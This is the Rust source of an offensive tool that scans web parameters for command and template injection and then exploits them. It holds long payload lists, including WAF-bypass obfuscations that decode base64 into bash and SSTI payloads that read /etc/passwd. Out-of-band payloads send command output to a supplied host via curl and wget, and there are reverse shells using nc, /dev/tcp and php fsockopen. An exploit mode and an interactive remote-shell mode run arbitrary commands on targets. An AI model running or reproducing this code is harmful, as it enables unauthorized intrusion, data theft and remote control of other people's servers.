mod payloads;

use clap::Parser;
use payloads::*;
use regex::Regex;
use reqwest::Client;
use reqwest::header::{HeaderMap, HeaderValue, COOKIE, USER_AGENT};
use serde::Serialize;
use std::sync::Arc;
use std::sync::atomic::{AtomicBool, Ordering};
use std::time::{Duration, Instant};
use tokio::sync::Semaphore;

#[derive(Parser)]
#[command(name = "rce_engine", version = "2.0.0")]
struct Args {
    #[arg(short = 'u', long)]
    url: String,

    #[arg(short = 'c', long)]
    cmd: Option<String>,

    #[arg(short = 'd', long)]
    data: Option<String>,

    #[arg(short = 'p', long)]
    param: Option<String>,

    #[arg(short = 'm', long, default_value = "GET")]
    method: String,

    #[arg(long, default_value = "10")]
    timeout: u64,

    #[arg(short = 't', long, default_value = "20")]
    threads: u32,

    #[arg(long)]
    proxy: Option<String>,

    #[arg(long)]
    cookie: Option<String>,

    #[arg(long, default_value = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36")]
    ua: String,

    #[arg(long)]
    oob: Option<String>,

    #[arg(long)]
    tech: Option<String>,

    #[arg(long)]
    header: Vec<String>,

    #[arg(long, default_value = "0")]
    delay: u64,

    #[arg(long, default_value = "1")]
    retries: u32,

    #[arg(long)]
    detect: bool,

    #[arg(long)]
    exploit: bool,

    #[arg(long)]
    blind: bool,

    #[arg(long)]
    all: bool,

    #[arg(long)]
    json: bool,

    #[arg(long)]
    verbose: bool,

    #[arg(long)]
    shell: bool,
}

#[derive(Serialize, Clone)]
struct RceResult {
    vulnerable: bool,
    url: String,
    parameter: String,
    method: String,
    payload: String,
    command: String,
    output: String,
    confidence: f64,
    engine: String,
    technique: String,
}

struct AppContext {
    client: Client,
    args: Args,
}

fn build_client(args: &Args) -> Client {
    let mut headers = HeaderMap::new();
    headers.insert(
        USER_AGENT,
        HeaderValue::from_str(&args.ua).unwrap_or(HeaderValue::from_static("Mozilla/5.0")),
    );
    if let Some(ref c) = args.cookie {
        headers.insert(COOKIE, HeaderValue::from_str(c).unwrap());
    }
    for h in &args.header {
        if let Some((k, v)) = h.split_once(':') {
            if let (Ok(key), Ok(val)) = (
                HeaderValue::from_str(k.trim()),
                HeaderValue::from_str(v.trim()),
            ) {
                headers.insert(
                    reqwest::header::HeaderName::from_bytes(k.trim().as_bytes()).unwrap(),
                    val,
                );
            }
        }
    }
    let mut builder = Client::builder()
        .timeout(Duration::from_secs(args.timeout + 10))
        .default_headers(headers)
        .danger_accept_invalid_certs(true);
    if let Some(ref p) = args.proxy {
        if let Ok(proxy) = reqwest::Proxy::http(p) {
            builder = builder.proxy(proxy);
        }
    }
    builder.build().unwrap()
}

fn extract_params(args: &Args) -> Vec<String> {
    if let Some(ref p) = args.param {
        return vec![p.clone()];
    }
    let mut params: Vec<String> = Vec::new();
    if let Some(qs) = args.url.split('?').nth(1) {
        for pair in qs.split('&') {
            if let Some(key) = pair.split('=').next() {
                if !key.is_empty() && !params.contains(&key.to_string()) {
                    params.push(key.to_string());
                }
            }
        }
    }
    if let Some(ref data) = args.data {
        for pair in data.split('&') {
            if let Some(key) = pair.split('=').next() {
                if !key.is_empty() && !params.contains(&key.to_string()) {
                    params.push(key.to_string());
                }
            }
        }
    }
    if params.is_empty() || args.all {
        let defaults = vec![
            "q","id","cmd","exec","command","url","host","file","input","search",
            "c","code","lang","debug","action","process","run","system","shell",
            "page","dir","folder","path","cat","read","include","require","open",
            "doc","document","template","view","load","import","config","setting",
            "option","opt","key","token","pass","password","user","username","email",
        ];
        if params.is_empty() {
            params = defaults.iter().map(|s| s.to_string()).collect();
        } else {
            for d in defaults {
                if !params.contains(&d.to_string()) {
                    params.push(d.to_string());
                }
            }
        }
    }
    params
}

fn build_url(base: &str, param: &str, payload: &str) -> String {
    let q_pos = base.find('?');
    let (prefix, existing_query) = if let Some(pos) = q_pos {
        (&base[..pos], Some(&base[pos + 1..]))
    } else {
        (base, None)
    };

    let mut pairs: Vec<(String, String)> = Vec::new();
    if let Some(qs) = existing_query {
        for pair in qs.split('&') {
            if let Some(eq_pos) = pair.find('=') {
                let k = &pair[..eq_pos];
                let v = &pair[eq_pos + 1..];
                pairs.push((k.to_string(), v.to_string()));
            } else {
                pairs.push((pair.to_string(), String::new()));
            }
        }
    }

    let mut found = false;
    for p in pairs.iter_mut() {
        if p.0 == param {
            p.1 = payload.to_string();
            found = true;
            break;
        }
    }
    if !found {
        pairs.push((param.to_string(), payload.to_string()));
    }

    let qs: Vec<String> = pairs
        .iter()
        .map(|(k, v)| format!("{}={}", url_encode(k), url_encode(v)))
        .collect();
    format!("{}?{}", prefix, qs.join("&"))
}

fn url_encode(s: &str) -> String {
    let mut result = String::new();
    for c in s.chars() {
        match c {
            'a'..='z' | 'A'..='Z' | '0'..='9' | '-' | '_' | '.' | '~' => result.push(c),
            ' ' => result.push('+'),
            _ => {
                for b in c.to_string().bytes() {
                    result.push_str(&format!("%{:02X}", b));
                }
            }
        }
    }
    result
}

async fn send_request(
    client: &Client,
    url: &str,
    method: &str,
    data: &Option<String>,
) -> Result<(String, Duration), String> {
    let start = Instant::now();
    let req = if method == "POST" || data.is_some() {
        let body = data.clone().unwrap_or_default();
        client
            .post(url)
            .body(body)
            .header("Content-Type", "application/x-www-form-urlencoded")
    } else {
        client.get(url)
    };

    match req.send().await {
        Ok(resp) => {
            let elapsed = start.elapsed();
            match resp.text().await {
                Ok(body) => Ok((body, elapsed)),
                Err(e) => Err(format!("read error: {}", e)),
            }
        }
        Err(e) => Err(format!("request error: {}", e)),
    }
}

fn check_error_patterns(body: &str) -> Vec<&'static str> {
    let patterns = [
        (r"(?i)warning", "warning"),
        (r"(?i)error", "error"),
        (r"(?i)unexpected", "unexpected"),
        (r"(?i)not found", "not found"),
        (r"(?i)command not found", "command not found"),
        (r"(?i)stack trace", "stack trace"),
        (r"(?i)Fatal error", "fatal error"),
        (r"(?i)exception", "exception"),
        (r"(?i)Traceback", "traceback"),
        (r"(?i)Parse error", "parse error"),
        (r"(?i)syntax error", "syntax error"),
        (r"(?i)undefined", "undefined"),
        (r"(?i)permission denied", "permission denied"),
        (r"(?i)cannot execute", "cannot execute"),
        (r"(?i)500$", "500 status"),
    ];
    let mut found = Vec::new();
    for (re, label) in &patterns {
        if let Ok(r) = Regex::new(re) {
            if r.is_match(body) {
                found.push(*label);
            }
        }
    }
    found
}

fn check_output_patterns(body: &str) -> Vec<&'static str> {
    let patterns = [
        (r"\d+:\d+:\d+ up \d+", "uptime"),
        (r"uid=\d+\(\w+\)", "userid"),
        (r"Linux \S+ \d+\.\d+\.\d+", "kernel"),
        (r"total\s+\d+", "ls_output"),
        (r"^\d+M\s+", "memory_info"),
        (r"root:\w+:0:0:", "passwd_entry"),
    ];
    let mut found = Vec::new();
    for (re, label) in &patterns {
        if let Ok(r) = Regex::new(re) {
            if r.is_match(body) {
                found.push(*label);
            }
        }
    }
    found
}

fn build_payloads<'a>(
    technique: &str,
    marker: &'a str,
    echo: &'a str,
    tech: &Option<String>,
    oob: &Option<String>,
) -> Vec<RCEPayload<'a>> {
    let mut all = Vec::new();

    match technique {
        "output" => {
            // ===== OUTPUT-BASED (35+ wrappers) =====
            let wrappers = [
                ";%s;", "|%s|", "`%s`", "$(%s)", "&%s&",
                "%0a%s%0a", "%0d%0a%s%0d%0a",
                "\\n%s\\n", "\\r\\n%s\\r\\n",
                "%09%s%09", "%00%s%00",
                "';%s;'", "\";%s;\"",
                "${%s}",
                "';\"%s\";'", "\"'%s'\"",
                "'\\\";%s;\"\\'", "\"\\';%s;'\\\"",
                ";%s #", "|%s #", "`%s` #", "$(%s) #",
                ";%s %23", ";%s <!--", ";%s /*", ";%s --",
                "|cmd /c %s |", ";cmd /c %s ;", "&cmd /c %s &",
                "&powershell -c \"%s\" &", ";powershell -c \"%s\" ;",
                "|powershell -c \"%s\" |",
                ";%s;echo DONE;", "&&%s&&", "||%s||", ";%s||echo FAIL;",
            ];
            for w in &wrappers {
                all.push(RCEPayload {
                    payload: w.replacen("%s", echo, 1),
                    technique: "output-based", os: "unix", echo_str: Some(marker),
                    sleep_time: 0, category: "output", severity: "high",
                });
            }

            // ===== WAF BYPASS (40+ bypasses) =====
            let waf = [
                ";e`cho` %s;", ";e$(cho) %s;",
                "';'e'c'h'o' '%s';'", ";e\\c\\h\\o %s;",
                ";e''cho %s;", ";e\"\"cho %s;",
                ";ech$()o %s;", ";e\"$@\"cho %s;",
                ";e\"$*\"cho %s;", ";e${x}cho %s;",
                ";prin\\ntf '%s\\n' %s;",
                ";/???/echo %s;", ";/bi?/echo %s;",
                ";/usr/bin/ech? %s;",
                ";EcHo %s;", ";ECHO %s;", ";eChO %s;",
                ";echo %s |base64 -d|bash;",
                ";echo %s |base64 --decode|sh;",
                ";python3 -c \"import base64;exec(base64.b64decode('%s'))\";",
                ";perl -e \"use MIME::Base64;print decode_base64('%s')\";",
                ";echo %s | tr 'A-Za-z' 'N-ZA-Mn-za-m'|bash;",
                ";bash -c \"echo $'%s'\"|bash;",
                "%253b%s%253b", "%25253b%s%25253b",
                ";echo\\t%s;",
                ";e\\fcho %s;", ";e\\rcho %s;",
            ];
            for w in &waf {
                all.push(RCEPayload {
                    payload: w.replacen("%s", marker, 1),
                    technique: "output-waf", os: "unix", echo_str: Some(marker),
                    sleep_time: 0, category: "output", severity: "critical",
                });
            }
            // WAF bypasses without marker substitution
            all.push(RCEPayload {
                payload: ";${PATH:0:1}cho $HOME;".to_string(),
                technique: "output-waf", os: "unix", echo_str: None,
                sleep_time: 0, category: "output", severity: "critical",
            });
            all.push(RCEPayload {
                payload: ";exec echo H4CK1T;".to_string(),
                technique: "output-waf", os: "unix", echo_str: Some("H4CK1T"),
                sleep_time: 0, category: "output", severity: "critical",
            });
            all.push(RCEPayload {
                payload: ";source /dev/stdin <<< \"echo H4CK1T\";".to_string(),
                technique: "output-waf", os: "unix", echo_str: Some("H4CK1T"),
                sleep_time: 0, category: "output", severity: "critical",
            });

            // ===== SHELL VARIANTS (20+ interpreters) =====
            let shells = [
                ";perl -e 'print \"%s\"' ;",
                ";python3 -c 'print(\"%s\")' ;",
                ";python -c 'print(\"%s\")' ;",
                ";ruby -e 'puts \"%s\"' ;",
                ";php -r 'echo \"%s\";' ;",
                ";node -e 'console.log(\"%s\")' ;",
                ";lua -e 'print(\"%s\")' ;",
                ";awk 'BEGIN{print \"%s\"}' ;",
                ";tclsh -c 'puts \"%s\"' ;",
                ";groovy -e 'println \"%s\"' ;",
                ";zsh -c 'echo %s' ;",
                ";dash -c 'echo %s' ;",
                ";ksh -c 'echo %s' ;",
                ";csh -c 'echo %s' ;",
                ";irb -e 'puts \"%s\"' ;",
                ";psql -c \"SELECT '%s'\" ;",
                ";mysql -e \"SELECT '%s'\" ;",
                ";sqlite3 :memory: \"SELECT '%s'\" ;",
                ";gdb -batch -ex 'print \"%s\"' -ex quit;",
            ];
            for w in &shells {
                all.push(RCEPayload {
                    payload: w.replacen("%s", marker, 1),
                    technique: "output-shell", os: "unix", echo_str: Some(marker),
                    sleep_time: 0, category: "output", severity: "high",
                });
            }

            // ===== PHP TECH-SPECIFIC (10+ payloads) =====
            if let Some(ref t) = tech {
                if t == "php" {
                    let php_payloads = [
                        "<?php echo '%s'; ?>",
                        "<?= '%s' ?>",
                        "<?php system('echo %s'); ?>",
                        "<?php exec('echo %s',$o);print(implode(\"\\n\",$o)); ?>",
                        "<?php shell_exec('echo %s'); ?>",
                        "<?php passthru('echo %s'); ?>",
                        "<?php $a=array(0=>'%s');echo implode($a); ?>",
                        "<?php eval('echo \"%s\";'); ?>",
                        "<?php assert('print \"%s\"'); ?>",
                        "<?php preg_replace('/.*/e','print \"%s\"',''); ?>",
                        "<?php $_='%s';echo$_; ?>",
                    ];
                    for w in &php_payloads {
                        all.push(RCEPayload {
                            payload: w.replacen("%s", marker, 1),
                            technique: "output-php", os: "php", echo_str: Some(marker),
                            sleep_time: 0, category: "output", severity: "critical",
                        });
                    }
                }
            }

            // ===== SSTI (15+ template injection payloads) =====
            let ssti = [
                // Twig
                ("{{7*7}}", "49"),
                ("{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"cat /etc/passwd\")}}", "root"),
                // Jinja2
                ("{{config}}", "SECRET"),
                ("{{''.__class__.__mro__[1].__subclasses__()}}", "Popen"),
                // Freemarker
                ("${7*7}", "49"),
                ("${T(java.lang.Runtime).getRuntime().exec('echo H4CK1T')}", "H4CK1T"),
                // Velocity
                ("#set($x=7*7)$x", "49"),
                // Jade
                ("#{7*7}", "49"),
                // ERB
                ("<%= 7*7 %>", "49"),
                ("<%= system('echo H4CK1T') %>", "H4CK1T"),
                // Tornado
                ("{% import os %}{{os.system('echo H4CK1T')}}", "H4CK1T"),
                // Smarty
                ("{system('echo H4CK1T')}", "H4CK1T"),
                // JSP EL
                ("${7*7}", "49"),
            ];
            for (payload, echo_str) in &ssti {
                all.push(RCEPayload {
                    payload: payload.to_string(),
                    technique: "ssti", os: "ssti", echo_str: Some(echo_str),
                    sleep_time: 0, category: "ssti", severity: "critical",
                });
            }

            // ===== HEADER INJECTION (6+ payloads) =====
            let hdr = [
                "\\necho H4CK1T\\n",
                "\\r\\necho H4CK1T\\r\\n",
                "'\\necho H4CK1T\\n'",
                "\"\\necho H4CK1T\\n\"",
                "%0aX-Custom:%20H4CK1T",
                "X-Forwarded-For: 127.0.0.1%0aX-Cmd:%20echo%20H4CK1T",
            ];
            for w in &hdr {
                all.push(RCEPayload {
                    payload: w.to_string(),
                    technique: "output-hdrinj", os: "unix", echo_str: Some("H4CK1T"),
                    sleep_time: 0, category: "output", severity: "high",
                });
            }
        }
        "time" => {
            // ===== TIME-BASED (30+ payloads) =====
            for s in &[3, 5, 7, 10, 15] {
                for w in &[";sleep(%d);", "|sleep(%d)|", "`sleep(%d)`", "$(sleep(%d))", "&sleep(%d)&",
                           "';sleep(%d);'", "\";sleep(%d);\"", "${sleep(%d)}", "%0asleep(%d)%0a"] {
                    all.push(RCEPayload {
                        payload: w.replacen("%d", &s.to_string(), 1),
                        technique: "time-based", os: "unix", echo_str: None,
                        sleep_time: *s, category: "time", severity: "high",
                    });
                }
            }
            // Ping-based
            for s in &[3, 5, 10] {
                all.push(RCEPayload {
                    payload: format!(";ping -c {} 127.0.0.1;", s),
                    technique: "time-based", os: "unix", echo_str: None,
                    sleep_time: *s, category: "time", severity: "high",
                });
                all.push(RCEPayload {
                    payload: format!(";ping -n {} 127.0.0.1;", s),
                    technique: "time-based", os: "windows", echo_str: None,
                    sleep_time: *s, category: "time", severity: "high",
                });
                all.push(RCEPayload {
                    payload: format!("|ping -n {} 127.0.0.1|", s),
                    technique: "time-based", os: "windows", echo_str: None,
                    sleep_time: *s, category: "time", severity: "high",
                });
                all.push(RCEPayload {
                    payload: format!("&ping -c {} 127.0.0.1&", s),
                    technique: "time-based", os: "unix", echo_str: None,
                    sleep_time: *s, category: "time", severity: "high",
                });
            }
            // Interpreter-based sleeps
            let interp = [
                (";python -c \"import time;time.sleep(5)\";", 5),
                (";perl -e \"sleep(5)\";", 5),
                (";ruby -e \"sleep(5)\";", 5),
                (";php -r \"sleep(5);\";", 5),
                (";node -e \"setTimeout(()=>{},5000)\";", 5),
                (";lua -e \"os.execute('sleep 5')\";", 5),
            ];
            for (payload, st) in &interp {
                all.push(RCEPayload {
                    payload: payload.to_string(),
                    technique: "time-based", os: "unix", echo_str: None,
                    sleep_time: *st, category: "time", severity: "high",
                });
            }
            // Busy-loop / dd / openssl / sha1sum delays
            let extra_time = [
                (";timeout 5 bash -c 'while true;do true;done';", 5),
                (";dd if=/dev/zero bs=1M count=100 2>/dev/null;", 5),
                (";openssl speed -engine 2>&1 >/dev/null;", 5),
                (";sha1sum /dev/zero 2>&1 >/dev/null &;", 3),
                (";TIMEOUT /T 5 /NOBREAK;", 5),
                ("|TIMEOUT /T 5 /NOBREAK|", 5),
            ];
            for (payload, st) in &extra_time {
                all.push(RCEPayload {
                    payload: payload.to_string(),
                    technique: "time-based", os: "unix", echo_str: None,
                    sleep_time: *st, category: "time", severity: "high",
                });
            }
        }
        "error" => {
            // ===== ERROR-BASED (15+ payloads) =====
            let err = [
                ";undefined_cmd_xyz_1749;", "|undefined_cmd_xyz_1749|",
                "$(undefined_cmd_xyz_1749)", "&undefined_cmd_xyz_1749&",
                "`undefined_cmd_xyz_1749`",
                ";cat /nonexistent_file_hackit_1749;", "|cat /nonexistent_file_hackit_1749|",
                ";type nonexistent_file_hackit_1749;",
                ";python -c \"1/0\";", ";perl -e \"1/0\";", ";php -r \"1/0;\";",
                ";ruby -e \"1/0\";",
                ";python -c \"a=[];print(a[99])\";",
                ";python -c \"import sys;sys.exit(1)\";",
                ";sh -c \"exit 1\";",
            ];
            for payload in &err {
                all.push(RCEPayload {
                    payload: payload.to_string(), technique: "error-based", os: "unix",
                    echo_str: None, sleep_time: 0, category: "error", severity: "medium",
                });
            }
        }
        "blind" => {
            // ===== BLIND BOOLEAN (15+ payloads) =====
            let blind_wrappers = [
                ";if echo %s; then echo %s; fi;",
                "|if echo %s; then echo %s; fi|",
                ";echo %s && echo %s;",
                ";echo %s || echo %s;",
                "&echo %s && echo %s&",
                "';if echo %s; then echo %s; fi;'",
                "\";if echo %s; then echo %s; fi;\"",
                "$(if echo %s; then echo %s; fi)",
                "`if echo %s; then echo %s; fi`",
                "|echo %s && echo %s #",
                ";echo %s && echo %s #",
                "|echo %s || echo %s #",
                "%0aecho %s && echo %s%0a",
                ";test -f /etc/passwd && echo %s;",
                ";test -d /root && echo %s;",
                ";which python && echo %s;",
                ";which curl && echo %s;",
            ];
            for w in &blind_wrappers {
                all.push(RCEPayload {
                    payload: w.replacen("%s", marker, 2),
                    technique: "blind-boolean", os: "unix", echo_str: Some(marker),
                    sleep_time: 0, category: "blind", severity: "high",
                });
            }
        }
        "oob" => {
            // ===== OOB (15+ payloads) =====
            if let Some(ref o) = oob {
                let oob_http = [
                    (";curl -s http://%s/$(id|base64 -w0) &", "oob-http"),
                    ("|curl -s http://%s/$(id|base64 -w0)|", "oob-http"),
                    (";wget -q -O- http://%s/$(id|base64 -w0) &", "oob-http"),
                ];
                for (w, tech) in &oob_http {
                    all.push(RCEPayload {
                        payload: w.replacen("%s", o, 1),
                        technique: tech, os: "unix", echo_str: None,
                        sleep_time: 0, category: "oob", severity: "critical",
                    });
                }
                let oob_dns = [
                    (";nslookup $(whoami).%s &", "oob-dns"),
                    (";dig +short $(hostname).%s &", "oob-dns"),
                    (";ping -c 1 $(id).%s &", "oob-dns"),
                ];
                for (w, tech) in &oob_dns {
                    all.push(RCEPayload {
                        payload: w.replacen("%s", o, 1),
                        technique: tech, os: "unix", echo_str: None,
                        sleep_time: 0, category: "oob", severity: "critical",
                    });
                }
                all.push(RCEPayload {
                    payload: format!(";python3 -c \"import urllib.request;urllib.request.urlopen('http://{}/'+__import__('base64').b64encode(__import__('os').popen('id').read().encode()).decode())\" &", o),
                    technique: "oob-http", os: "unix", echo_str: None,
                    sleep_time: 0, category: "oob", severity: "critical",
                });
                all.push(RCEPayload {
                    payload: format!(";perl -e \"use LWP::Simple;getstore('http://{}/'.encode_base64('id'),'x')\" &", o),
                    technique: "oob-http", os: "unix", echo_str: None,
                    sleep_time: 0, category: "oob", severity: "critical",
                });
                all.push(RCEPayload {
                    payload: format!(";nc -e /bin/sh {} 4444 &", o),
                    technique: "oob-rev", os: "unix", echo_str: None,
                    sleep_time: 0, category: "oob", severity: "critical",
                });
                all.push(RCEPayload {
                    payload: format!(";bash -i >& /dev/tcp/{}/4444 0>&1 &", o),
                    technique: "oob-rev", os: "unix", echo_str: None,
                    sleep_time: 0, category: "oob", severity: "critical",
                });
                all.push(RCEPayload {
                    payload: format!("|bash -i >& /dev/tcp/{}/4444 0>&1|", o),
                    technique: "oob-rev", os: "unix", echo_str: None,
                    sleep_time: 0, category: "oob", severity: "critical",
                });
                all.push(RCEPayload {
                    payload: format!(";php -r \"$sock=fsockopen('{}',4444);exec('/bin/sh -i <&3 >&3 2>&3');\" &", o),
                    technique: "oob-rev", os: "unix", echo_str: None,
                    sleep_time: 0, category: "oob", severity: "critical",
                });
            }
        }
        _ => {}
    }
    all
}

async fn test_payload(
    client: &Client,
    args: &Args,
    param: &str,
    payload: &RCEPayload<'_>,
) -> Option<RceResult> {
    for _ in 0..args.retries.max(1) {
        let test_url = build_url(&args.url, param, &payload.payload);
        match send_request(client, &test_url, &args.method, &args.data).await {
            Ok((body, elapsed)) => {
                let mut vuln = false;
                let mut confidence = 0.0;
                let mut output = String::new();
                let mut technique = payload.technique.to_string();

                match payload.category {
                    "time-based" => {
                        let min_dur = Duration::from_secs(payload.sleep_time as u64);
                        if elapsed >= min_dur && payload.sleep_time > 0 {
                            vuln = true; confidence = 0.85;
                            output = format!("Time delay: {}s (actual: {:?})", payload.sleep_time, elapsed);
                        }
                    }
                    "ssti" => {
                        if let Some(echo) = payload.echo_str {
                            if body.contains(echo) {
                                vuln = true; confidence = 0.80;
                                output = format!("SSTI: template injection matched '{}'", echo);
                            }
                        }
                    }
                    "output" | "output-waf" | "output-shell" | "output-php" | "output-hdrinj" => {
                        if let Some(echo) = payload.echo_str {
                            if body.contains(echo) {
                                vuln = true;
                                confidence = if payload.category == "output-waf" { 0.93 } else { 0.95 };
                                output = format!("Output RCE: marker '{}' reflected", echo);
                            }
                        }
                        if !vuln {
                            let matches = check_output_patterns(&body);
                            if !matches.is_empty() {
                                vuln = true; confidence = 0.80;
                                technique = "output-regex".to_string();
                                output = format!("Output RCE (regex): {:?}", matches);
                            }
                        }
                    }
                    "error-based" => {
                        let matches = check_error_patterns(&body);
                        if !matches.is_empty() {
                            vuln = true;
                            confidence = (0.65 + matches.len() as f64 * 0.05).min(0.90);
                            output = format!("Error RCE: {:?}", matches);
                        }
                    }
                    "blind-boolean" => {
                        if let Some(echo) = payload.echo_str {
                            if body.contains(echo) {
                                vuln = true; confidence = 0.90;
                                output = "Blind boolean RCE".to_string();
                            }
                        }
                    }
                    _ => {}
                }

                if vuln {
                    return Some(RceResult {
                        vulnerable: true, url: args.url.clone(),
                        parameter: param.to_string(), method: args.method.clone(),
                        payload: payload.payload.clone(), command: String::new(),
                        output, confidence, engine: "rust".into(), technique,
                    });
                }
                if args.delay > 0 {
                    tokio::time::sleep(Duration::from_millis(args.delay)).await;
                }
            }
            Err(_) => {}
        }
    }
    None
}

async fn scan(ctx: &Arc<AppContext>) -> Vec<RceResult> {
    let params = extract_params(&ctx.args);
    let marker = echo_marker();
    let echo = echo_cmd();
    let found = Arc::new(AtomicBool::new(false));

    let techniques: Vec<&str> = if ctx.args.blind {
        vec!["blind", "time", "output"]
    } else {
        vec!["output", "time", "error", "blind", "oob"]
    };
    // SSTI is always included as part of "output" technique via build_payloads

    let semaphore = Arc::new(Semaphore::new(ctx.args.threads as usize));
    let results = Arc::new(std::sync::Mutex::new(Vec::new()));

    let mut handles = Vec::new();
    for param in &params {
        let ctx = Arc::clone(ctx);
        let p = param.clone();
        let techs = techniques.clone();
        let marker = marker.clone();
        let echo = echo.clone();
        let found = Arc::clone(&found);
        let sem = Arc::clone(&semaphore);
        let results = Arc::clone(&results);

        handles.push(tokio::spawn(async move {
            let _permit = sem.acquire().await.unwrap();
            if found.load(Ordering::Relaxed) {
                return;
            }
            for tech in &techs {
                if found.load(Ordering::Relaxed) {
                    return;
                }
                let payloads = build_payloads(
                    tech, &marker, &echo,
                    &ctx.args.tech, &ctx.args.oob,
                );
                for payload in &payloads {
                    if found.load(Ordering::Relaxed) {
                        return;
                    }
                    if let Some(result) = test_payload(&ctx.client, &ctx.args, &p, payload).await {
                        if result.vulnerable {
                            found.store(true, Ordering::Relaxed);
                            let mut lock = results.lock().unwrap();
                            lock.push(result);
                            return;
                        }
                    }
                }
            }
        }));
    }

    for handle in handles {
        handle.await.ok();
    }

    let mut final_results = results.lock().unwrap().clone();
    if final_results.is_empty() {
        final_results.push(RceResult {
            vulnerable: false, url: ctx.args.url.clone(),
            parameter: String::new(), method: ctx.args.method.clone(),
            payload: String::new(), command: String::new(),
            output: "No RCE vulnerabilities detected".into(),
            confidence: 0.0, engine: "rust".into(), technique: "none".into(),
        });
    }
    final_results
}

async fn exploit_all(ctx: &Arc<AppContext>) -> Vec<RceResult> {
    let params = extract_params(&ctx.args);
    let cmd = ctx.args.cmd.clone().unwrap_or_else(|| "id".to_string());
    let mut results = Vec::new();

    let wrappers: Vec<fn(&str) -> String> = vec![
        |c| format!(";{};", c), |c| format!("|{}|", c), |c| format!("`{}`", c),
        |c| format!("$({})", c), |c| format!("&{}&", c),
        |c| format!("';{};'", c), |c| format!("\";{};\"", c),
        |c| format!("${{{}}}", c), |c| format!("%0a{}%0a", c),
        |c| format!("%0d%0a{}%0d%0a", c), |c| format!("&&{}&&", c), |c| format!("||{}||", c),
        |c| format!("&{} #", c), |c| format!("|{} #", c), |c| format!(";{} #", c),
        |c| format!(";{} %23", c), |c| format!(";{} <!--", c),
        |c| format!("&cmd /c {} &", c), |c| format!(";powershell -c \"{}\" ;", c),
        |c| format!("|cmd /c {} |", c), |c| format!("|powershell -c \"{}\" |", c),
    ];

    for param in &params {
        for wrapper in &wrappers {
            let payload = wrapper(&cmd);
            let test_url = build_url(&ctx.args.url, param, &payload);
            if let Ok((body, _)) = send_request(&ctx.client, &test_url, &ctx.args.method, &ctx.args.data).await {
                if !body.is_empty() {
                    results.push(RceResult {
                        vulnerable: true, url: ctx.args.url.clone(),
                        parameter: param.clone(), method: ctx.args.method.clone(),
                        payload, command: cmd.clone(),
                        output: body.chars().take(4096).collect(),
                        confidence: 1.0, engine: "rust".into(), technique: "exploit".into(),
                    });
                    break;
                }
            }
        }
    }
    results
}

async fn shell_mode(ctx: &Arc<AppContext>) {
    let params = extract_params(&ctx.args);
    let wrappers: Vec<fn(&str) -> String> = vec![
        |c| format!(";{};", c), |c| format!("|{}|", c), |c| format!("`{}`", c),
        |c| format!("$({})", c), |c| format!("&{}&", c),
        |c| format!("';{};'", c), |c| format!("\";{};\"", c),
        |c| format!("${{{}}}", c), |c| format!("%0a{}%0a", c),
        |c| format!("%0d%0a{}%0d%0a", c), |c| format!("&&{}&&", c), |c| format!("||{}||", c),
        |c| format!("&{} #", c), |c| format!("|{} #", c), |c| format!(";{} #", c),
        |c| format!("&cmd /c {} &", c), |c| format!(";powershell -c \"{}\" ;", c),
    ];

    eprintln!("[!] RCE SHELL ACTIVE — type 'exit' to quit");
    eprintln!("[!] Target: {}", ctx.args.url);
    eprintln!("[!] Engine: Rust");
    eprintln!("[!] Parameters: {:?}", params);

    let mut input = String::new();
    loop {
        eprint!("$ ");
        use std::io::Write;
        std::io::stderr().flush().ok();
        input.clear();
        if std::io::stdin().read_line(&mut input).is_err() { break; }
        let cmd = input.trim();
        if cmd.is_empty() || cmd == "exit" || cmd == "quit" { break; }

        for param in &params {
            for wrapper in &wrappers {
                let payload = wrapper(cmd);
                let test_url = build_url(&ctx.args.url, param, &payload);
                if let Ok((body, _)) = send_request(&ctx.client, &test_url, &ctx.args.method, &ctx.args.data).await {
                    if !body.is_empty() {
                        println!("{}", body.trim());
                        break;
                    }
                }
            }
        }
    }
    eprintln!("[!] Shell closed");
}

#[tokio::main]
async fn main() {
    let args = Args::parse();

    if args.url.is_empty() {
        eprintln!(r#"{{"error":"target URL required (-u flag)"}}"#);
        std::process::exit(1);
    }

    let client = build_client(&args);
    let ctx = Arc::new(AppContext { client, args: args });

    if ctx.args.shell {
        shell_mode(&ctx).await;
        return;
    }

    let results = if ctx.args.exploit || ctx.args.cmd.is_some() {
        exploit_all(&ctx).await
    } else {
        scan(&ctx).await
    };

    if ctx.args.json {
        println!("{}", serde_json::to_string(&results).unwrap());
        return;
    }

    let vuln_count = results.iter().filter(|r| r.vulnerable).count();
    for r in &results {
        if r.vulnerable {
            let out: String = r.output.chars().filter(|c| *c != '\n').take(200).collect();
            println!("VULNERABLE|{}|{}|{}|{:.4}|{}", r.url, r.parameter, r.technique, r.confidence, out);
        } else if vuln_count == 0 {
            println!("SAFE|{}|none|no_rce|0.0|Target appears secure", ctx.args.url);
        }
    }

    if vuln_count > 0 {
        println!("SUMMARY|{} vulnerable|RCE CONFIRMED", vuln_count);
    } else {
        println!("SUMMARY|0 vulnerabilities|Target secure");
    }
}
